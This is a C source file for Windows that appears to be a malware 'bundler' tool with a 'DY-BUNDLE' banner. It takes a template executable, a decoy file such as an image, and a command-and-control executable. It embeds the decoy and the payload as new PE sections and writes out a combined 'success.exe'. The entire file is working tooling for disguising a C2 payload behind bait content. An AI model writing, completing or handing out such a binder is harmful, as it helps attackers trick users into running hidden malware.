#include <stdio.h>
#include <Windows.h>
#include <string.h>

#define END "[END]"
#define SectionNameLen 8

struct FileInfo
{
	FILE* file;
	int len;
	char* path;
	char* type;
	char* buf;
	char* start[MAX_PATH];
	char* end;
};

void getFileName(const char* path, char* name) {
	const char* lastSlash = strrchr(path, '\\');
	if (!lastSlash) {
		lastSlash = strrchr(path, '/');
	}
	if (lastSlash) {
		strcpy_s(name, MAX_PATH, "[FILE]");
		strcpy_s(name + strlen("[FILE]"), MAX_PATH, lastSlash + 1);
		strcpy_s(name + strlen("[FILE]") + strlen(lastSlash + 1), MAX_PATH, "#");
	}
	else {
		strcpy_s(name, MAX_PATH, "[FILE]");
		strcpy_s(name + strlen("[FILE]"), MAX_PATH, path);
		strcpy_s(name + strlen("[FILE]") + strlen(path), MAX_PATH, "#");
	}
}

void readFileInfo(struct FileInfo* fileInfo, int startFlagLen) {

	if (startFlagLen != 0) {
		getFileName(fileInfo->path, fileInfo->start);
		fileInfo->type = strrchr(fileInfo->path, '.') + 1;
		fileInfo->end = END;
	}

	fopen_s(&(fileInfo->file), fileInfo->path, "rb");

	if (fileInfo->file == NULL) {
		printf("%s 不存在\n", fileInfo->path);
		exit(-1);
	}

	fseek(fileInfo->file, 0, SEEK_END);
	fileInfo->len = ftell(fileInfo->file);
	fseek(fileInfo->file, 0, SEEK_SET);

	size_t virtualSize = 0;
	if (startFlagLen != 0) {
		virtualSize = startFlagLen + fileInfo->len + strlen(END);
	}
	else {
		virtualSize = startFlagLen + fileInfo->len;
	}

	char* buf = VirtualAlloc(NULL, virtualSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (startFlagLen != 0) {
		memcpy(buf, fileInfo->start, MAX_PATH);
	}
	fread(buf + startFlagLen, 1, fileInfo->len, fileInfo->file);

	if (startFlagLen != 0) {
		memcpy(buf + startFlagLen + fileInfo->len, fileInfo->end, strlen(END));
		fileInfo->len = startFlagLen + fileInfo->len + strlen(fileInfo->end);
	}
	else {
		fileInfo->len = startFlagLen + fileInfo->len;
	}

	fileInfo->buf = buf;

	fclose(fileInfo->file);
}

DWORD computing(DWORD srcLen, DWORD dstLen) {
	if (srcLen % dstLen == 0) {
		return srcLen;
	}
	else {
		return ((srcLen / dstLen) + 1) * dstLen;
	}
}

void addSection(struct FileInfo* exeInfo, struct FileInfo* baitFile, struct FileInfo* c2File) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)(exeInfo->buf);

	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(exeInfo->buf + dosHeader->e_lfanew);

	PIMAGE_FILE_HEADER fileHeader = &(ntHeader->FileHeader);

	PIMAGE_OPTIONAL_HEADER optionHeader = &(ntHeader->OptionalHeader);

	PIMAGE_SECTION_HEADER sectionHeader = ntHeader + 1;
	PIMAGE_SECTION_HEADER lastSectionHeader = sectionHeader + fileHeader->NumberOfSections - 1;
	PIMAGE_SECTION_HEADER addBaitSectionHeader = sectionHeader + fileHeader->NumberOfSections;
	PIMAGE_SECTION_HEADER addC2SectionHeader = sectionHeader + fileHeader->NumberOfSections + 1;

	DWORD lastSectionHeaderVLen = computing(lastSectionHeader->Misc.VirtualSize, optionHeader->SectionAlignment);

	memcpy(addBaitSectionHeader->Name, baitFile->type, strlen(baitFile->type));
	addBaitSectionHeader->Misc.VirtualSize = computing(baitFile->len, optionHeader->SectionAlignment);
	addBaitSectionHeader->VirtualAddress = lastSectionHeaderVLen + lastSectionHeader->VirtualAddress;
	addBaitSectionHeader->SizeOfRawData = computing(baitFile->len, optionHeader->FileAlignment);
	addBaitSectionHeader->PointerToRawData = lastSectionHeader->SizeOfRawData + lastSectionHeader->PointerToRawData;
	addBaitSectionHeader->PointerToLinenumbers = 0;
	addBaitSectionHeader->PointerToRelocations = 0;
	addBaitSectionHeader->NumberOfLinenumbers = 0;
	addBaitSectionHeader->NumberOfRelocations = 0;
	addBaitSectionHeader->Characteristics = 0x60000020;

	memcpy(addC2SectionHeader->Name, c2File->type, strlen(c2File->type));
	addC2SectionHeader->Misc.VirtualSize = computing(c2File->len, optionHeader->SectionAlignment);
	addC2SectionHeader->VirtualAddress = addBaitSectionHeader->Misc.VirtualSize + addBaitSectionHeader->VirtualAddress;
	addC2SectionHeader->SizeOfRawData = computing(c2File->len, optionHeader->FileAlignment);
	addC2SectionHeader->PointerToRawData = addBaitSectionHeader->SizeOfRawData + addBaitSectionHeader->PointerToRawData;
	addC2SectionHeader->PointerToLinenumbers = 0;
	addC2SectionHeader->PointerToRelocations = 0;
	addC2SectionHeader->NumberOfLinenumbers = 0;
	addC2SectionHeader->NumberOfRelocations = 0;
	addC2SectionHeader->Characteristics = 0x60000020;

	fileHeader->NumberOfSections += 2;

	optionHeader->SizeOfImage += addBaitSectionHeader->Misc.VirtualSize;
	optionHeader->SizeOfImage += addC2SectionHeader->Misc.VirtualSize;


	size_t virtualSize = exeInfo->len + addBaitSectionHeader->SizeOfRawData + addC2SectionHeader->SizeOfRawData;

	char* exeData = VirtualAlloc(NULL, virtualSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(exeData, exeInfo->buf, exeInfo->len);
	memcpy(exeData + exeInfo->len, baitFile->buf, addBaitSectionHeader->SizeOfRawData);
	memcpy(exeData + exeInfo->len + addBaitSectionHeader->SizeOfRawData, c2File->buf, addC2SectionHeader->SizeOfRawData);

	FILE* sfile;
	fopen_s(&sfile, "success.exe", "wb");
	if (sfile == NULL) {
		perror("fopen_s failed");
		return;
	}
	fwrite(exeData, 1, exeInfo->len + addBaitSectionHeader->SizeOfRawData + addC2SectionHeader->SizeOfRawData, sfile);

	fclose(sfile);

	printf("Write Success \n");

}

void printBanner() {
	printf("\n.------..------..------..------..------..------..------..------..------.\n");
	printf("|D.--. ||Y.--. ||-.--. ||B.--. ||U.--. ||N.--. ||D.--. ||L.--. ||E.--. |\n");
	printf("| :\\/: || (\\/) || (\\/) || :(): || (\\/) || :(): || :/\\: || :/\\: || (\\/) |\n");
	printf("| (__) || :\\/: || :\\/: || ()() || :\\/: || ()() || (__) || (__) || :\\/: |\n");
	printf("| '--'D|| '--'Y|| '--'-|| '--'B|| '--'U|| '--'N|| '--'D|| '--'L|| '--'E|\n");
	printf("`------'`------'`------'`------'`------'`------'`------'`------'`------'\n\n");
}

int main1(int argc, char* argv[]) {
	if (argc != 4) {

		printBanner();

		printf("Usage:\n\n");
		printf("  %s <模板文件> <打开的文件> <执行的exe>\n", argv[0]);
		printf("  %s template.exe 1.png 1.exe\n", argv[0]);

		return 1;
	}


	for (int i = 1; i < argc; i++) {
		if (strlen(argv[i]) == 0) {
			printf("Error: Parameter %d is empty.\n", i);
			return 1;
		}
	}
	printBanner();

	struct FileInfo exeFile;
	exeFile.path = argv[1];
	readFileInfo(&exeFile, 0);

	struct FileInfo baitFile;
	baitFile.path = argv[2];
	readFileInfo(&baitFile, MAX_PATH);

	struct FileInfo c2File;
	c2File.path = argv[3];
	readFileInfo(&c2File, MAX_PATH);

	addSection(&exeFile, &baitFile, &c2File);

	return 0;
}


